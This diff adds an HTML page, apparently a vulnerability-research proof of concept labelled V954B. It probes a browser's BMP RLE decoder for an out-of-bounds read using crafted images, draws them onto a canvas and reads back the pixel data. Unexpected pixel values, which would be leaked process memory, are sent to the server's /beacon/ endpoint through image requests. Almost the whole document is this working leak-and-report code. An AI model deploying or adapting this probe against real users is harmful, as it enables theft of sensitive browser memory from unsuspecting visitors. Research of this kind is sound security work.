@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V954B</title></head>
+<body><pre id="out">V954B — BMP RLE4/RLE8/RLE24 absolute-run OOB read (321754-class, B)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  try{new Image().src='/beacon/V954B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,700))+'&t='+Date.now()+'&s=1';}catch(e){}
+}
+function hx(n){ var s=n.toString(16); return s.length<2?'0'+s:s; }
+function p32(d,w,x,y){ var i=(y*w+x)*4; return hx(d[i])+hx(d[i+1])+hx(d[i+2])+hx(d[i+3]); }
+function loadImg(src){ return new Promise(function(res){
+  var im=new Image();
+  im.onload=function(){res({im:im,ok:true});};
+  im.onerror=function(){res({im:im,ok:false,err:'onerror'});};
+  im.src=src+'?cb='+Date.now()+'_'+Math.random();
+});}
+function topKeys(seen,n){ var ks=Object.keys(seen); ks.sort(function(a,b){return seen[b]-seen[a];}); return ks.slice(0,n).map(function(k){return k+':'+seen[k];}).join(','); }
+async function probe(name,src,expect){
+  bk('T-PRE',name);
+  try{
+    var r=await loadImg(src);
+    bk('LOAD',name+'|ok='+r.ok+'|nw='+r.im.naturalWidth+'|nh='+r.im.naturalHeight+'|cw='+r.im.width+'|ch='+r.im.height);
+    if(!r.ok || !r.im.naturalWidth){
+      bk('T-RES',name+'|decode-fail (clean-fail/patched expected)');
+      say(name+': decode/load failed (nw='+r.im.naturalWidth+')');
+      return;
+    }
+    var w=r.im.naturalWidth, h=r.im.naturalHeight;
+    var c=document.createElement('canvas'); c.width=w; c.height=h;
+    var ctx=c.getContext('2d'); ctx.clearRect(0,0,w,h);
+    try{ ctx.drawImage(r.im,0,0); }catch(e){ bk('DRAW-ERR',name+'|'+String(e&&e.message||e).slice(0,140)); return; }
+    var d=ctx.getImageData(0,0,w,h).data;
+    var samp=[];
+    var xs=[0,1,2,3,4,5,6,7,Math.floor(w/2),w-2,w-1].filter(function(x,i,a){return x>=0&&x<w&&a.indexOf(x)===i;}).sort(function(a,b){return a-b;});
+    var ys=[0,1,Math.floor(h/2),h-2,h-1].filter(function(y,i,a){return y>=0&&y<h&&a.indexOf(y)===i;}).sort(function(a,b){return a-b;});
+    for(var yi=0;yi<ys.length;yi++) for(var xi=0;xi<xs.length;xi++) samp.push(p32(d,w,xs[xi],ys[yi])+'@'+xs[xi]+','+ys[yi]);
+    bk('PX',name+'|'+w+'x'+h+'|'+samp.join('|'));
+    var seen={}; for(var i=0;i+3<d.length;i+=4){ var k=hx(d[i])+hx(d[i+1])+hx(d[i+2])+hx(d[i+3]); seen[k]=(seen[k]||0)+1; }
+    var uniq=Object.keys(seen).length;
+    // anomaly heuristic vs expected set (if provided): count pixels not in expect
+    var anom=0, anomSamp=[];
+    if(expect && expect.length){
+      var ex={}; for(var ei=0;ei<expect.length;ei++) ex[expect[ei]]=1;
+      for(var y=0;y<h;y++) for(var x=0;x<w;x++){ var k=p32(d,w,x,y); if(!ex[k]){ anom++; if(anomSamp.length<10) anomSamp.push(k+'@'+x+','+y); } }
+    }
+    bk('STAT',name+'|uniq='+uniq+'|anom='+anom+'|top='+topKeys(seen,6)+(anomSamp.length?'|as='+anomSamp.join(','):''));
+    say(name+': '+w+'x'+h+' uniq='+uniq+' anom='+anom);
+  }catch(e){ bk('T-ERR',name+'|'+String(e&&e.message||e).slice(0,160)); }
+}
+(async function(){
+  bk('BOOT','321754 BMP RLE absolute-run OOB read (RLE4/RLE8/RLE24). STOP if clean-fail/crash/no readable anomalous data');
+  // crafted assets on server: RLE8 8x2 palette absolute run; RLE4 8x2; RLE24(OS/2-style comp=4 attempt) 8x3
+  await probe('rle8_abs','v954b_rle8_abs.bmp',null);
+  await probe('rle4_abs','v954b_rle4_abs.bmp',null);
+  await probe('rle24_abs','v954b_rle24_abs.bmp',null);
+  // control: V952B RLE24 trunc (known clean/no-anom result reference)
+  await probe('ctrl_rle24','v952b_rle24_crash.bmp',null);
+  bk('DONE','complete|note=clean-fail or no anomalous readable pixels=>not actionable; anomalous pixels=>candidate disclosure');
+  say('\nV954B complete.');
+})();
+</script>
+</body></html>
